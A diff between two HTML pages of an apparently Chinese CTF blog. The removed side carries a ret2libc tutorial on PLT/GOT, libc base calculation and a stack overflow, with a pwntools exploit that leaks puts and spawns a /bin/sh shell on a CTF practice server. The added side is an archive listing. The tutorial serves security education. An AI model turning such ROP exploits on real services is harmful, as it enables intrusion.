@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.7.6">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  
-  <link rel="canonical" href="http://example.com/2022/09/23/ret2libc/"/>
+  <meta name="robots" content="noindex,follow">
+  <link rel="canonical" href="http://example.com/archives/2022/page/5/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -32,19 +32,17 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>ret2libc - Chen</title>
+  <title>Archive: 2022 - Chen</title>
   <meta name="keywords" content="null">
   <meta desc name="description" content="ChenBlog - Chen - Chen">
   
-<meta property="og:type" content="article">
-<meta property="og:title" content="ret2libc">
-<meta property="og:url" content="http://example.com/2022/09/23/ret2libc/index.html">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Chen">
+<meta property="og:url" content="http://example.com/archives/2022/page/5/index.html">
 <meta property="og:site_name" content="Chen">
-<meta property="og:description" content="前置知识了解随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量 那么我们还有办法自己构建一个后门函数吗 不知道还记不记得在最开始的栈溢出那一题，我们提到了plt表和got表 在当时，为了照顾新手入坑pwn的感受，我们只是粗略的得出plt调用函数，got存真实地址的服务于做题的结论 现在，让我们解释一下这个">
+<meta property="og:description" content="ChenBlog">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
-<meta property="article:published_time" content="2022-09-23T12:53:48.000Z">
-<meta property="article:modified_time" content="2022-09-24T16:01:54.574Z">
 <meta property="article:author" content="Chen">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -2045,7 +2043,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <!-- Custom Files bodyBegin begin-->
     
     <!-- Custom Files bodyBegin end-->
-    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur show" style='opacity: 0' >
+    <header itemscope itemtype="http://schema.org/WPHeader" id="l_header" class="l_header auto shadow floatable blur " style='opacity: 0' >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -2314,7 +2312,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper post search' style="display: none;">
+      <div id="half" class='cover-wrapper  search' style="display: ;">
         
   <div class='cover-bg lazyload placeholder' data-bg="https://s1.ax1x.com/2022/11/11/zCx6gA.png"></div>
 
@@ -2362,8 +2360,16 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
         <div class="body-wrapper">
           
 <div id="l_main" class=''>
-  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
-  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/23/ret2libc/">
+	
+		
+  <section class="post-list">
+    
+    
+      
+        
+          <div class='post-wrapper'>
+            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
+  <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/13/pwn入门指南/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="Chen">
   </span>
@@ -2372,311 +2378,81 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="ChenBlog">
   </span>
   
-
-
+  
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  <div class="article-meta" id="top">
+  
     
+    <h2 class="article-title"  itemprop="name headline">
+      <a href="/2022/09/13/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"  itemprop="url">
+        pwn入门指南
+      </a>
+    </h2>
+  
+  <div class='md article-desc' itemprop="articleBody">
     
-    
-      <h1 class="title" itemprop="name headline">
-        ret2libc
-      </h1>
-      <div class='new-meta-box'>
-        
-          
-            
-<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <a itemprop="url" class='author' href="/" rel="nofollow">
-    <img itemprop="image" src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/apple-touch-icon.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-    <p itemprop="name">请设置文章作者</p>
-  </a>
-</div>
-
-          
-        
-          
-            
-  <div class='new-meta-item category'>
-    <i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i>
-    <a class="category-link" href="/categories/%E6%A0%88/">栈</a>
-    
-      <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
-        <a href="/categories/%E6%A0%88/" itemprop="url"><span itemprop="name">栈</span></a>
-      </span>
+      
+        本文旨在简要概括ctf中pwn方向的主要学习知识，以供不知道学习什么方向或者不知道如何学习pwn的人参考
+什么是pwn就我个人在刚决定入门这个方向的时候，我是希望有人给予我一个清楚的定义，即这个方向是如何完成ctf中的题目。所以最为关键的引导，我决定通过一个简单的pwn题来向你体现pwn是一个怎样的方向，并且就我个人而言，我是不希望将pwn的教程写的又臭又长，接下来的一系列教程将以尽量幽默形...
+      
     
   </div>
-
-
+  
+    <div class='meta-v3' line_style='solid'>
+      <div>
+        
+        <time itemprop="dateCreated datePublished" datetime="2022-09-13T14:11:35+08:00">2022-09-13</time>
+        
+          <span class="dot"></span>
+          <a class="category-link" href="/categories/%E5%9F%BA%E7%A1%80/">基础</a>
+          
+            <span hidden itemprop="about" itemscope itemtype="http://schema.org/Thing">
+              <a href="/categories/%E5%9F%BA%E7%A1%80/" itemprop="url"><span itemprop="name">基础</span></a>
+            </span>
           
         
-          
-            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2022-09-23T20:53:48+08:00">
-  <a class='notlink'>
-    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
-    <p>发布于：Sep 23, 2022</p>
-  </a>
+      </div>
+      
+        <div>
+          <a class='readmore' href='/2022/09/13/pwn%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/' itemprop="url">
+            Read More
+          </a>
+        </div>
+      
+    </div>
+  
+
 </div>
 
-          
+          </div>
         
-          
-            
-
-
-
-          
+      
+    
+  </section>
+  
+    
+      <br>
+      <div class="prev-next">
         
-        <!-- Custom Files topMeta begin-->
+          <a class="prev" rel="prev" href="/archives/2022/page/4/">
+            <section class="post prev white-box shadow floatable blur" >
+              <i class="fa-solid fa-chevron-left" aria-hidden="true"></i>&nbsp;Previous&nbsp;
+            </section>
+          </a>
         
-        <!-- Custom Files topMeta end-->
+        <p class="current">
+          5 / 5
+        </p>
+        
       </div>
     
-  </div>
-
-
-  <div id="layoutHelper-page-plugins"></div>
-  <div id="post-body" itemprop="articleBody">
-    <h2 id="前置知识了解"><a href="#前置知识了解" class="headerlink" title="前置知识了解"></a>前置知识了解</h2><p>随着我们做题的深入，我们会发现有些题目并不会给予我们后门函数，并且也没有ret2shellcode可以供我们存放shellcode的bss段变量</p>
-<p>那么我们还有办法自己构建一个后门函数吗</p>
-<p>不知道还记不记得在最开始的栈溢出那一题，我们提到了plt表和got表</p>
-<p>在当时，为了照顾新手入坑pwn的感受，我们只是粗略的得出plt调用函数，got存真实地址的服务于做题的结论</p>
-<p>现在，让我们解释一下这个结论的原因</p>
-<p>我们先前已经讲过，got表的作用是因为动态链接的存在，为了使应用程序方便的获取libc中的真实地址</p>
-<p>并且只有当程序运行和函数调用过后，got表中保存的才会是该函数的libc的绝对地址</p>
-<p>而plt表虽然引用的也是got表中的真实地址，但是注意这里并不是说明got表能够调用这个函数</p>
-<p>plt表之所以能够调用函数，而got不行的关键原因是因为plt表还起到了把控制(程序执行流)转移到对应的函数</p>
-<p>当然上述的解释并不详细，许多原理性的问题没有讲到，如果将来想要死磕pwn的同学，建议花时间去专研透底层逻辑的问题(当然现在没有必要)</p>
-<p>所以我们是不是可以得出一条逻辑链，当程序没有给予我们现成的后门函数的时候，我们可以通过system的plt表来调用system函数</p>
-<p>但是说的容易做起来难，我们如何获得system函数的plt表地址呢？</p>
-<p>这里我们只需要记住一个公式 <strong>真实地址 &#x3D; 基址 + 偏移</strong></p>
-<p>即我们通过puts等函数泄露出来的函数地址是真实地址，我们可以通过计算偏移来求出libc基址</p>
-<p>然后依据libc基址和偏移量得出其他函数的真实地址，从而随意调用</p>
-<p>但是如果我们不了解libc版本，即题目附件并为给出呢</p>
-<p>这里还需要了解一下libc中函数地址偏移的概念</p>
-<p>如果开启了pie保护机制，函数的地址将在每次运行时发生变化</p>
-<p>但是其后三位由于虚拟地址页的映射机制，将不会发生变化(前提是在同一个libc版本中)</p>
-<p>因此，如果题目没有给予我们libc文件的话，我们可以通过函数的后三位来推演出libc版本，从而求得libc基址</p>
-<h2 id="wp演示"><a href="#wp演示" class="headerlink" title="wp演示"></a>wp演示</h2><p><a target="_blank" rel="noopener" href="https://imgloc.com/i/VuxWi"><img src="https://s1.328888.xyz/2022/09/24/VuxWi.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/24/VuxWi.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="VuxWi.png"></a></p>
-<p>先看一下保护机制，但是看不出什么苗头</p>
-<p>拖到ida里面看看</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Glad to meet you again!What u bring to me this time?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">96</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok.See you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>有一个fgets输入任意字节的数据可以用来栈溢出，但是看了下函数列表，好像没有后门函数可以供我们返回</p>
-<p>并且程序也没有提供给我们可以用来泄露函数地址的puts等</p>
-<p>没办法了，我们只能连同puts函数泄露其真实地址一起构造</p>
-<p>看到这里是不是仍然不太明白，看看exp的构造就知道了</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">from</span> pwn <span class="keyword">import</span>*   </span><br><span class="line"><span class="number">2</span> io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28548</span>)</span><br><span class="line"><span class="number">3</span> elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="number">4</span> libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"><span class="number">5</span> io.recvuntil(<span class="string">&quot;Glad to meet you again!What u bring to me this time?&quot;</span>)</span><br><span class="line"><span class="number">6</span> puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">7</span> main_addr = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"><span class="number">8</span> rdi_addr = <span class="number">0x400753</span></span><br><span class="line"><span class="number">9</span> ret_addr = <span class="number">0x40050e</span></span><br><span class="line"><span class="number">10</span> puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">11</span> puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">12</span> payload = cyclic(<span class="number">40</span>)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line"><span class="number">13</span> io.sendline(payload)</span><br><span class="line"><span class="number">14</span> io.recvuntil(<span class="string">&quot;Ok.See you!&quot;</span>)</span><br><span class="line"><span class="number">15</span> puts_addr = u64(io.recvuntil(<span class="string">&quot;\nGlad to meet you again!What u bring to me this time?\n&quot;</span>,drop =            <span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="number">16</span> libc_addr = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="number">17</span> system_addr = libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="number">18</span> binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="number">19</span> payload = cyclic(<span class="number">40</span>)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line"><span class="number">20</span> io.sendline(payload)</span><br><span class="line"><span class="number">21</span> io.recvuntil(<span class="string">&quot;Ok.See you!&quot;</span>)</span><br><span class="line"><span class="number">22</span> io.interactive()</span><br></pre></td></tr></table></figure>
-
-<p>第四行这里，我们之所以要装载题目附件所给我们的libc-2.31.so文件</p>
-<p>是因为我们需要获取该libc版本的各函数相较于基址的偏移</p>
-<p>同理，这里还有两种办法可以获取(实际上还有三种，但是最后一种我还不会用[截止到文章发布，如果后续学会了将会补上])</p>
-<p><strong>获取libc版本偏移-第一种办法</strong></p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/V1qBm"><img src="https://s1.328888.xyz/2022/09/24/V1qBm.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/24/V1qBm.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="V1qBm.png"></a></p>
-<p>在该网站 我们可以通过输入对应函数的后3位数值来检索对应的libc版本(比如图中检索到了3个版本，通常是都得试试的)</p>
-<p><a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search (blukat.me)</a></p>
-<p><strong>获取libc版本偏移-第二种办法</strong></p>
-<p>libcsearch这个工具也能获取偏移</p>
-<p>由于网上对于这个工具的安装和使用不计其数</p>
-<p>这里我只负责介绍这个工具，安装过程如果出现问题可以看看这个博客<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40026795/article/details/107150265">(3条消息) LibcSearcher的安装使用_Catch_1t_AlunX的博客-CSDN博客</a></p>
-<p>说回到exp，我们继续往下看，截止到12行的第一个payload都是一些前置的要点获取</p>
-<p>cyclic生成40个字节的垃圾数据这个没有任何难度理解</p>
-<p>rdi寄存器传参这条之前也解释过了，puts_got显然就是将puts函数的真实地址传给rdi</p>
-<p>接下来的puts_plt便是调用puts函数，输出puts函数的真实地址</p>
-<p>接着为什么要返回到main函数？因为我们还需要接收puts的真实地址，并且我们只能输入96个字节的数据，如果一次性构造payload过长则无法成功</p>
-<p>第三个疑点来到了15行，有很多我们没有见过的语法？</p>
-<p>u64，[-6:]，ljust？这些都是什么东西，一个一个讲</p>
-<p><strong>u64&#x2F;u32</strong></p>
-<p>不知道你还记不记得我们之前讲过的bite型，他起到了<strong>数据的传输和存储的作用</strong></p>
-<p>你是不是一直有个疑问，为什么我们要用到p64和p32</p>
-<p>实际上p是将括号内的数据打包成二进制字节数据流(可以理解为bite型)</p>
-<p>而如果我们要想接收，并且转化为我们能看懂的数据类型，就需要用到u</p>
-<p>为了方便理解，我们看一下如果没有u64，我们得到的数据会是什么样子<a target="_blank" rel="noopener" href="https://imgloc.com/i/V5Q4p"><img src="https://s1.328888.xyz/2022/09/24/V5Q4p.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/24/V5Q4p.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="V5Q4p.png"></a></p>
-<p><strong>[-n:]</strong></p>
-<p>其作用就是决定recv从倒数第n个字节开始读取</p>
-<p>但是为什么这里是6呢？我们试试4，5，7这些数字会导致什么结果</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/V5SIo"><img src="https://s1.328888.xyz/2022/09/24/V5SIo.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/24/V5SIo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="V5SIo.png"></a></p>
-<p>这里不知道你发现没有，一个字节对应着两个字符(之前提过了，这里小复习一下)</p>
-<p>并且由于小端序，所以我们从倒数第几个字节开始接收，影响着我们得到的真实地址的后三位</p>
-<p>拜托，这可是致命的错误，后三位错了我们还怎么获得偏移</p>
-<p>通常，函数的真实地址虽然是8字节(64位)，但是由于其头两个字节的数据恒为00 00</p>
-<p>所以我们只需要从倒数第六字节开始读取(反而言之，就是你要从倒8处读也行)</p>
-<p>欸 你说 我偏不要呢 我就不要[-6:]你来帮我限制读入的字节数量</p>
-<p>反正我就8字节的地址呗</p>
-<p>如果你尝试了以后就会报错，为什么？</p>
-<p>因为我们不单单只读入了函数的真实地址，数据传输以及内存地址分配是一个复杂的过程</p>
-<p>而我们将其改为100试试，仍然可以正常读入数据</p>
-<p>但是你会发现在地址结尾处多出来了个0a，实际上他是换行符，这个换行符是哪里来的？</p>
-<p>仔细观察14行 我们在接收的时候，并未一起接收换行符</p>
-<p>这一点说明了什么?修改为100后都能读取倒上一个字符串的数据了，那我们刚刚不还说在函数地址上面，还有很多其他数据呢？</p>
-<p>这里就可以介绍介绍ljust了</p>
-<p><strong>ljust</strong></p>
-<p>他的作用就是限制我们读入的字节总数，如果不够的话则以我们设定好的字符填充</p>
-<p>所以我们哪怕[-n:]中的n取到了100也仍然不会报错</p>
-<p>说回exp 在第一个payload输送完以后，我们成功获得函数的真实地址</p>
-<p>接着就是计算偏移然后求得其他函数以及binsh字符串的地址</p>
-<p>还是老办法构造payload，并且这里还需要一个ret来栈对齐</p>
-<h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><p>一点小补充吧 相信会有人和我有一样的疑问，在刚接触到ret2libc的时候</p>
-<p>既然我们都将got表中的puts函数真实地址作为参数存储在了rdi寄存器中输送再接收</p>
-<p>而且获取真实地址的方法只需要一个elf.got就行了</p>
-<p>为什么我们不能直接拿这个地址来进行计算基址呢？</p>
-<p>很简单，我们debug看一下，如果我们直接使用got表中的真实地址，他是一个什么东西</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/V9Hs7"><img src="https://s1.328888.xyz/2022/09/24/V9Hs7.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/24/V9Hs7.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="V9Hs7.png"></a></p>
-<p>我们再看一下 通过我们上文的办法得到的真实地址长什么样子</p>
-<p><a target="_blank" rel="noopener" href="https://imgloc.com/i/V9XjE"><img src="https://s1.328888.xyz/2022/09/25/V9XjE.png" class="lazyload" data-srcset="https://s1.328888.xyz/2022/09/25/V9XjE.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="V9XjE.png"></a></p>
-<p>可以看到明显不一样</p>
-<p>这是因为got表中保存的值是需要运行过后才会为真实地址，所以我们需要将其打印出来再接收(这里我也有点不太理解，埋个坑，日后填)</p>
-
-  </div>
-  
-  
-    
-    <div class='footer'>
-       <!-- 参考资料、相关资料等 -->
-      
-       <!-- 相关文章 -->
-      
-      <!-- 版权声明组件 -->
-      
-      <!-- 打赏组件 -->
-      
-    </div>
-  
-  
-    
-
-
-  <div class='article-meta' id="bottom">
-    <div class='new-meta-box'>
-      
-        
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2022-09-25T00:01:54+08:00">
-  <a class='notlink'>
-    <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Sep 25, 2022</p>
-  </a>
-</div>
-
-        
-      
-        
-          
-
-        
-      
-        
-          
-  <div class="new-meta-item share -mob-share-list">
-  <div class="-mob-share-list share-body">
-    
-      
-        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://example.com/2022/09/23/ret2libc/&title=ret2libc - Chen&summary="
-          
-          >
-          
-            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://example.com/2022/09/23/ret2libc/&title=ret2libc - Chen&summary="
-          
-          >
-          
-            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-          
-        </a>
-      
-    
-      
-        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
-          
-          target="_blank" href="http://service.weibo.com/share/share.php?url=http://example.com/2022/09/23/ret2libc/&title=ret2libc - Chen&summary="
-          
-          >
-          
-            <img src="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
-          
-        </a>
-      
-    
-      
-    
-      
-    
-  </div>
-</div>
-
-
-
-        
-      
-    </div>
-    <!-- Custom Files bottomMeta begin -->
-    
-    <!-- Custom Files bottomMeta end -->
-  </div>
-
-
-  
-  
-
-  
-    <div class="prev-next">
-      
-        <a class='prev' href='/2022/09/25/ret2csu/'>
-          <p class='title'><i class="fa-solid fa-chevron-left" aria-hidden="true"></i>ret2csu</p>
-          <p class='content'>我们已经了解过了基础的rop，其主要的局限性在于大部分的题目都是动态链接
-不一定有那么刚好的汇编代码可以供我们构造rop链
-今天我们了解的这种方法，将不受动态链接或者静态链接的限制
-我们今天的主...</p>
-        </a>
-      
-      
-        <a class='next' href='/2022/09/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/'>
-          <p class='title'>格式化字符串基础漏洞<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
-          <p class='content'>格式化字符串漏洞原理printf应该是我们学习c语言起使用的最频繁的函数了
-其语法我们熟悉的不能再熟悉了—&gt;printf (“格式化字符串”,参量… )
-我们可以写一段代码：
-123456...</p>
-        </a>
-      
-    </div>
-  
-  <!-- Custom Files postEnd begin-->
-  
-  <!-- Custom Files postEnd end-->
-</article>
-
-
   
 
 
-  <article class="post white-box shadow floatable blur" id="comments">
-    <span hidden>
-      <meta itemprop="discussionUrl" content="/2022/09/23/ret2libc/index.html#comments">
-    </span>
-    <p ct><i class='fa-solid fa-comments'></i> 评论</p>
-    
-
-    <div id="layoutHelper-comments"></div>
-
-  </article>
-
-
-
-
-
-
+	
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -2685,52 +2461,177 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
+<section class="widget blogger desktop mobile pjax">
+  <div class='content'>
+    
+      
+        <a class='avatar flat-box rectangle' href='/about/'>
+          <img no-lazy src='https://s1.ax1x.com/2022/11/11/zCx4US.jpg'/>
+        </a>
+      
+    
+    
+      <div class='text'>
+        
+          <h2>Chen</h2>
+        
+        
+        
+      </div>
+    
+    
+      <div class="social-wrapper">
+        
+          
+            <a href="/atom.xml"
+              class="social fa-solid fa-rss flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="mailto:me@xxx.com"
+              class="social fa-solid fa-envelope flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="https://github.com/volantis-x/"
+              class="social fab fa-github flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+          
+            <a href="/"
+              class="social fa-solid fa-headphones-alt flat-btn"
+              target="_blank"
+              rel="external nofollow noopener noreferrer">
+              
+            </a>
+          
+        
+      </div>
+    
+  </div>
+</section>
+
+    
+  
+
+  
+    
+    
+      
+  
+  <section class="widget category desktop pjax">
+    
+  <header>
+    
+      <a href='/blog/categories/'><i class="fa-solid fa-folder-open fa-fw" aria-hidden="true"></i><span class='name'>文章分类</span></a>
+    
+  </header>
+
+
+    <div class='content'>
+      <ul class="entry navigation">
+        
+          <li><a class="flat-box"
+            title="/categories/Linux/" href="/categories/Linux/"
+            active-action="action-categoriesLinux"
+            ><div class='name'>Linux</div><div class='badge'>(2)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/reverse/" href="/categories/reverse/"
+            active-action="action-categoriesreverse"
+            ><div class='name'>reverse</div><div class='badge'>(3)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/web/" href="/categories/web/"
+            active-action="action-categoriesweb"
+            ><div class='name'>web</div><div class='badge'>(3)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/wp/" href="/categories/wp/"
+            active-action="action-categorieswp"
+            ><div class='name'>wp</div><div class='badge'>(9)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E5%9F%BA%E7%A1%80/" href="/categories/%E5%9F%BA%E7%A1%80/"
+            active-action="action-categoriesE59FBAE7A180"
+            ><div class='name'>基础</div><div class='badge'>(3)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E5%A0%86/" href="/categories/%E5%A0%86/"
+            active-action="action-categoriesE5A086"
+            ><div class='name'>堆</div><div class='badge'>(2)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E5%AF%86%E7%A0%81/" href="/categories/%E5%AF%86%E7%A0%81/"
+            active-action="action-categoriesE5AF86E7A081"
+            ><div class='name'>密码</div><div class='badge'>(1)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E6%A0%88/" href="/categories/%E6%A0%88/"
+            active-action="action-categoriesE6A088"
+            ><div class='name'>栈</div><div class='badge'>(14)</div></a></li>
+        
+          <li><a class="flat-box"
+            title="/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/" href="/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/"
+            active-action="action-categoriesE8999AE68B9FE69CBA"
+            ><div class='name'>虚拟机</div><div class='badge'>(4)</div></a></li>
+        
+      </ul>
+    </div>
+  </section>
+
+
+    
+  
+
+  
+    
+    
+      
+
+    
+  
+
+  
+    
+    
+      
+<section class="widget text desktop pjax">
+  
+  <header>
+    
+      <a target="_blank" rel="noopener" href='https://space.bilibili.com/185447556'><i class="fab fa-github fa-fw" aria-hidden="true"></i><span class='name'>b站账号</span></a>
+    
+  </header>
+
+
+  <div class='content'>
+    
+  </div>
+</section>
+
     
   
 
 
 <div class="widget-sticky pjax">
 
-  
-  
-
-
-  <section class="widget toc-wrapper desktop mobile " id="toc-div" >
-    
-  <header>
-    
-      <i class="fa-solid fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
-    
-  </header>
-
-
-    <div class='content'>
